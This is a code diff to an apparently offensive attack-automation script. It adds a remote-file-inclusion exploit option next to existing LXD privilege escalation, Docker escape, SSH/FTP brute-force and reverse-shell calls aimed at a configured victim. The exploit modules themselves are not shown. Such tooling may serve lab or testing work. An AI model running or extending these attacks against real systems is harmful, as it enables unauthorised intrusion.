@@ -4,6 +4,7 @@ import requests
 from datetime import datetime
 from Privilege_Escalation_LXD import LXD_exploit
 from DockerEscape import escape_docker
+from FileInclusion import file_inclusion
 from configparser import ConfigParser 	
 from SSH import ssh_bruteforce
 from FTP import ftp_bruteforce
@@ -25,14 +26,18 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 			attacker_info = config_object["ATTACKERINFO"]
 			victim_info = config_object["VICTIMINFO"]
 			general_info = config_object["GENERALINFO"]
-			
 			print('[*] (On Repeat, Attack {i} of {k}) <'.format(i=i+1, k=k), end="")
+		
 		match int(exp):
 			case 1:
 				if arguments.repeat != None:
 					print("LXD>")
 				send_rev(attacker_info, victim_info)
-				LXD_exploit.run(victim_info, attacker_info, general_info, arguments)
+				
+				# The rep value (k-(i+1)) represents the run we are currently in
+				# That way we only cleanup on the attacker side on the last iteration
+				# Otherwise we are required to download and install everything at every iteration
+				LXD_exploit.run(victim_info, attacker_info, general_info, arguments, k-(i+1))
 			case 2:
 				pass
 			case 3:
@@ -48,11 +53,16 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 				if arguments.repeat != None:
 					print("FTP>")
 				ftp_bruteforce.run(victim_info, attacker_info, general_info, arguments)
+			case 6:
+				if arguments.repeat != None:
+					print("FileInclusion>")
+				file_inclusion.RFI(victim_info, attacker_info, general_info, arguments)
 			case default:
 				sys.exit("Something went wrong, invalid exploit")
 		
 		# Generate a new port for each attack, avoid the TIME_WAIT
-		create_conf.gen_config(False)
+		if i != k-1 :
+			create_conf.gen_config(False)
 		
 def launch_exploit(attacker_info, victim_info):
 	now = datetime.now()
